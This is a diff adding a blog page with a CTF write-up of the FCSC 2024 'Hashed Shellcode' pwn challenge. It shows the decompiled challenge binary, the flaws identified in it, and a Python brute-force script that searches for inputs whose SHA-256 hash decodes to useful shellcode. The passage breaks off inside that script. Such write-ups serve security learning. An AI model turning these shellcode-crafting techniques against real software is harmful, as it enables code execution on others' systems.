@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <script defer data-domain="itarow.xyz" src="https://plausible.itarow.xyz/js/plausible.js"></script>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> FCSC 2024 - Hashed Shellcode - Pwn | Itarow</title>
+  <link rel = 'canonical' href = 'https://blog.itarow.xyz/posts/fcsc2024_hashed_shellcode/'>
+  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="FCSC 2024 - Hashed Shellcode - Pwn" />
+<meta property="og:description" content="This is the write-up of Hashed Shellcode challenge which was in the Pwn category for the FCSC 2024. It is a shellcode challenge based on hashes of inputs.
+Description Did you like FCSC 2021&rsquo;s Encrypted Shellcode? Guess what? Here&rsquo;s the hashed version!
+Resolution Here is the code of the binary :
+v7 = __readfsqword(0x28u); if ( mprotect((void *)((unsigned __int64)input_conv_shellcode &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7) ) { perror(&#34;mprotect&#34;); exit(1); } chk = 0LL; do { while ( 1 ) { puts(&#34;Input:&#34;); memset(input_conv_shellcode, 0, sizeof(input_conv_shellcode)); size_read = read(0, input_conv_shellcode, 0x20uLL); if ( size_read &lt;= 0 ) { perror(&#34;read&#34;); exit(1); } if ( input_conv_shellcode[size_read - 1] == &#39;\n&#39; ) input_conv_shellcode[--size_read] = 0; chk &#43;= size_read; chk -= input_conv_shellcode[0] == &#39;F&#39;; chk -= input_conv_shellcode[1] == &#39;C&#39;; chk -= input_conv_shellcode[2] == &#39;S&#39;; chk -= input_conv_shellcode[3] == &#39;C&#39;; j = 5; chk -= input_conv_shellcode[4] == &#39;_&#39;; while ( size_read &gt; j ) { if ( strchr( &#34;0123456789:;&lt;=&gt;?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.itarow.xyz/posts/fcsc2024_hashed_shellcode/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-14T22:16:17+02:00" />
+<meta property="article:modified_time" content="2024-04-14T22:16:17+02:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="FCSC 2024 - Hashed Shellcode - Pwn"/>
+<meta name="twitter:description" content="This is the write-up of Hashed Shellcode challenge which was in the Pwn category for the FCSC 2024. It is a shellcode challenge based on hashes of inputs.
+Description Did you like FCSC 2021&rsquo;s Encrypted Shellcode? Guess what? Here&rsquo;s the hashed version!
+Resolution Here is the code of the binary :
+v7 = __readfsqword(0x28u); if ( mprotect((void *)((unsigned __int64)input_conv_shellcode &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7) ) { perror(&#34;mprotect&#34;); exit(1); } chk = 0LL; do { while ( 1 ) { puts(&#34;Input:&#34;); memset(input_conv_shellcode, 0, sizeof(input_conv_shellcode)); size_read = read(0, input_conv_shellcode, 0x20uLL); if ( size_read &lt;= 0 ) { perror(&#34;read&#34;); exit(1); } if ( input_conv_shellcode[size_read - 1] == &#39;\n&#39; ) input_conv_shellcode[--size_read] = 0; chk &#43;= size_read; chk -= input_conv_shellcode[0] == &#39;F&#39;; chk -= input_conv_shellcode[1] == &#39;C&#39;; chk -= input_conv_shellcode[2] == &#39;S&#39;; chk -= input_conv_shellcode[3] == &#39;C&#39;; j = 5; chk -= input_conv_shellcode[4] == &#39;_&#39;; while ( size_read &gt; j ) { if ( strchr( &#34;0123456789:;&lt;=&gt;?"/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://blog.itarow.xyz/css/styles.4dd8e96d6c0d53a6965a5a357c26fc29f6b838ad352dc5acda0754ff4b9409e5c58fa94716892c2a5d6a7e1b1bef8fbcaf2442656e81dfae00dc9464d707477d.css" integrity="sha512-TdjpbWwNU6aWWlo1fCb8Kfa4OK01LcWs2gdU/0uUCeXFj6lHFoksKl1qfhsb74&#43;8ryRCZW6B364A3JRk1wdHfQ=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://blog.itarow.xyz/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://blog.itarow.xyz/posts/fcsc2024_soc_simulator/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&text=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&title=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&is_video=false&description=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&title=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&title=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&name=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn&description=This%20is%20the%20write-up%20of%20Hashed%20Shellcode%20challenge%20which%20was%20in%20the%20Pwn%20category%20for%20the%20FCSC%202024.%20It%20is%20a%20shellcode%20challenge%20based%20on%20hashes%20of%20inputs.%0aDescription%20Did%20you%20like%20FCSC%202021%26rsquo%3bs%20Encrypted%20Shellcode%3f%20Guess%20what%3f%20Here%26rsquo%3bs%20the%20hashed%20version%21%0aResolution%20Here%20is%20the%20code%20of%20the%20binary%20%3a%0av7%20%3d%20__readfsqword%280x28u%29%3b%20if%20%28%20mprotect%28%28void%20%2a%29%28%28unsigned%20__int64%29input_conv_shellcode%20%26amp%3b%200xFFFFFFFFFFFFF000LL%29%2c%200x1000uLL%2c%207%29%20%29%20%7b%20perror%28%26%2334%3bmprotect%26%2334%3b%29%3b%20exit%281%29%3b%20%7d%20chk%20%3d%200LL%3b%20do%20%7b%20while%20%28%201%20%29%20%7b%20puts%28%26%2334%3bInput%3a%26%2334%3b%29%3b%20memset%28input_conv_shellcode%2c%200%2c%20sizeof%28input_conv_shellcode%29%29%3b%20size_read%20%3d%20read%280%2c%20input_conv_shellcode%2c%200x20uLL%29%3b%20if%20%28%20size_read%20%26lt%3b%3d%200%20%29%20%7b%20perror%28%26%2334%3bread%26%2334%3b%29%3b%20exit%281%29%3b%20%7d%20if%20%28%20input_conv_shellcode%5bsize_read%20-%201%5d%20%3d%3d%20%26%2339%3b%5cn%26%2339%3b%20%29%20input_conv_shellcode%5b--size_read%5d%20%3d%200%3b%20chk%20%2b%3d%20size_read%3b%20chk%20-%3d%20input_conv_shellcode%5b0%5d%20%3d%3d%20%26%2339%3bF%26%2339%3b%3b%20chk%20-%3d%20input_conv_shellcode%5b1%5d%20%3d%3d%20%26%2339%3bC%26%2339%3b%3b%20chk%20-%3d%20input_conv_shellcode%5b2%5d%20%3d%3d%20%26%2339%3bS%26%2339%3b%3b%20chk%20-%3d%20input_conv_shellcode%5b3%5d%20%3d%3d%20%26%2339%3bC%26%2339%3b%3b%20j%20%3d%205%3b%20chk%20-%3d%20input_conv_shellcode%5b4%5d%20%3d%3d%20%26%2339%3b_%26%2339%3b%3b%20while%20%28%20size_read%20%26gt%3b%20j%20%29%20%7b%20if%20%28%20strchr%28%20%26%2334%3b0123456789%3a%3b%26lt%3b%3d%26gt%3b%3f" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_hashed_shellcode%2f&t=FCSC%202024%20-%20Hashed%20Shellcode%20-%20Pwn" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#resolution">Resolution</a>
+      <ul>
+        <li><a href="#debugging-the-context">Debugging the context</a></li>
+        <li><a href="#start-to-create-hashes">Start to create hashes</a></li>
+        <li><a href="#remote-exploit">Remote exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        FCSC 2024 - Hashed Shellcode - Pwn
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2024-04-14 22:16:17 &#43;0200 CEST" itemprop="datePublished">2024-04-14</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          11 minute read
+        </div>
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/fcsc2024">FCSC2024</a>
+            
+        </div>
+        
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p>This is the write-up of Hashed Shellcode challenge which was in the Pwn category for the FCSC 2024. It is a shellcode challenge based on hashes of inputs.</p>
+<h2 id="description">Description</h2>
+<p>Did you like FCSC 2021&rsquo;s Encrypted Shellcode? Guess what? Here&rsquo;s the hashed version!</p>
+<h2 id="resolution">Resolution</h2>
+<p>Here is the code of the binary :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mprotect</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)input_conv_shellcode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFF000LL</span>), <span style="color:#ae81ff">0x1000uLL</span>, <span style="color:#ae81ff">7</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mprotect&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  chk <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Input:&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memset</span>(input_conv_shellcode, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(input_conv_shellcode));
+</span></span><span style="display:flex;"><span>      size_read <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, input_conv_shellcode, <span style="color:#ae81ff">0x20uLL</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( size_read <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;read&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( input_conv_shellcode[size_read <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span> )
+</span></span><span style="display:flex;"><span>        input_conv_shellcode[<span style="color:#f92672">--</span>size_read] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      chk <span style="color:#f92672">+=</span> size_read;
+</span></span><span style="display:flex;"><span>      chk <span style="color:#f92672">-=</span> input_conv_shellcode[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;F&#39;</span>;
+</span></span><span style="display:flex;"><span>      chk <span style="color:#f92672">-=</span> input_conv_shellcode[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;C&#39;</span>;
+</span></span><span style="display:flex;"><span>      chk <span style="color:#f92672">-=</span> input_conv_shellcode[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;S&#39;</span>;
+</span></span><span style="display:flex;"><span>      chk <span style="color:#f92672">-=</span> input_conv_shellcode[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;C&#39;</span>;
+</span></span><span style="display:flex;"><span>      j <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+</span></span><span style="display:flex;"><span>      chk <span style="color:#f92672">-=</span> input_conv_shellcode[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;_&#39;</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ( size_read <span style="color:#f92672">&gt;</span> j )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strchr</span>(
+</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">&#34;0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">]^_`abcdefghijklmnopqrstuvwxyz{|}&#34;</span>,
+</span></span><span style="display:flex;"><span>               input_conv_shellcode[j]) )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">--</span>chk;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">++</span>j;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( chk <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> ) <span style="color:#75715e">// [1]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Invalid input, retry! %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, chk);
+</span></span><span style="display:flex;"><span>      chk <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SHA256_Init</span>(hash);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SHA256_Update</span>(hash, input_conv_shellcode, size_read);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SHA256_Final</span>(input_conv_shellcode, hash);
+</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#f92672">**</span>)(<span style="color:#66d9ef">void</span>))input_conv_shellcode)();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( chk ); <span style="color:#75715e">// [2]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;                                   <span style="color:#75715e">// ---
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                                <span style="color:#75715e">// chk just after shellcode in the BSS
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>The binary reads 32 bytes from stdin and does some checks on it, it checks if it starts with <code>FCSC_</code>, and contains only some alphanumerical characters. The program used a global varibale (chk), to confirm the validity of the input. Then he makes a sha256sum of it and jumps on the result, as a shellcode.</p>
+<p>So the shellcode which is executed is sha256sum of our input, seems funny.</p>
+<p>There is no bypass of condition but we could notice three things after reversing it :</p>
+<ul>
+<li><code>[1]</code> the comparaison of chk is signed so if chk is less than 0, the input will be considered as valid</li>
+<li><code>[2]</code> the code loop while chk is not 0</li>
+<li><code>[3]</code> the chk variable is located right after our shellcode in the BSS section</li>
+</ul>
+<h3 id="debugging-the-context">Debugging the context</h3>
+<p>On a shellcode challenge, it&rsquo;s useful to know the context of when the shellcode is executed. By context, I mean registers values and memory.
+We use gdb and a breakpoint to see it.
+I used <a href="https://github.com/mahaloz/decomp2dbg">decomp2dbg</a> plugin with stripped binary to save time having symbols in gdb.</p>
+<p><img src="/img/hashed_shellcode/1.png" alt=""></p>
+<p>There are a few things interesting, the register RSI points on the chk variable, which is the check variable for the loop. RDX points to our shellcode.</p>
+<h3 id="start-to-create-hashes">Start to create hashes</h3>
+<p>When I started the challenge, I tried to bruteforce like a monkey random valid inputs, create hash from them and disassemble them with captstone library.
+I put some constraints on the disassemble output to have like syscall, no instructions which are going to make my shellcode crash, etc&hellip;</p>
+<p>Because It wasn&rsquo;t very successful, I started to create more clever scripts using the context registers. For example, I tried to find a hash input to have a <code>push r13; ret</code> to ret2main.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> capstone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cs <span style="color:#f92672">=</span> Cs(CS_ARCH_X86, CS_MODE_64)
+</span></span><span style="display:flex;"><span>random<span style="color:#f92672">.</span>seed(<span style="color:#ae81ff">0x0409</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BANNED_INSTRUCTIONS <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;leave&#39;</span>, <span style="color:#e6db74">&#39;retf&#39;</span>, <span style="color:#e6db74">&#39;iretd&#39;</span>,<span style="color:#e6db74">&#39;int3&#39;</span>,<span style="color:#e6db74">&#39;pop&#39;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_random_input</span>():
+</span></span><span style="display:flex;"><span>    charset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">]^_`abcdefghijklmnopqrstuvwxyz{|}&#34;</span>
+</span></span><span style="display:flex;"><span>    input_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FCSC_&#34;</span>
+</span></span><span style="display:flex;"><span>    input_str <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choice(charset) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>, MAX_INPUT_LENGTH))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> input_str
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_sha256</span>(data):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hashlib<span style="color:#f92672">.</span>sha256(data<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">contains_register</span>(ins_str, registers):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> reg <span style="color:#f92672">in</span> registers:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> reg <span style="color:#f92672">in</span> ins_str:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disassemble_code</span>(code):
+</span></span><span style="display:flex;"><span>    disas <span style="color:#f92672">=</span> cs<span style="color:#f92672">.</span>disasm(code, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    ret_found <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    r13_chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    o_chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    disassembly_output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ins <span style="color:#f92672">in</span> disas:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ins<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">in</span> BANNED_INSTRUCTIONS:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>,<span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        disassembly_output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (ins<span style="color:#f92672">.</span>address, ins<span style="color:#f92672">.</span>mnemonic, ins<span style="color:#f92672">.</span>op_str)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ins<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;push&#39;</span> <span style="color:#f92672">and</span> (<span style="color:#e6db74">&#34;r13&#34;</span> <span style="color:#f92672">in</span> ins<span style="color:#f92672">.</span>op_str):
+</span></span><span style="display:flex;"><span>            r13_chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> ins<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;ret&#39;</span> <span style="color:#f92672">and</span> ins<span style="color:#f92672">.</span>op_str <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
+</span></span><span style="display:flex;"><span>            ret_found <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    code_valid <span style="color:#f92672">=</span> ret_found <span style="color:#f92672">and</span> r13_chk
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> code_valid, disassembly_output
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    num_valid_hashes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> num_valid_hashes <span style="color:#f92672">&lt;</span> NUM_INPUTS:
+</span></span><span style="display:flex;"><span>        input_str <span style="color:#f92672">=</span> generate_random_input()
+</span></span><span style="display:flex;"><span>        hash_value <span style="color:#f92672">=</span> calculate_sha256(input_str)
+</span></span><span style="display:flex;"><span>        code_valid, disassembly_output <span style="color:#f92672">=</span> disassemble_code(hash_value)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> code_valid:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Input: </span><span style="color:#e6db74">{</span>input_str<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Hash SHA256: </span><span style="color:#e6db74">{</span>hash_value<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Disassembled Output:&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(disassembly_output)
+</span></span><span style="display:flex;"><span>            num_valid_hashes <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
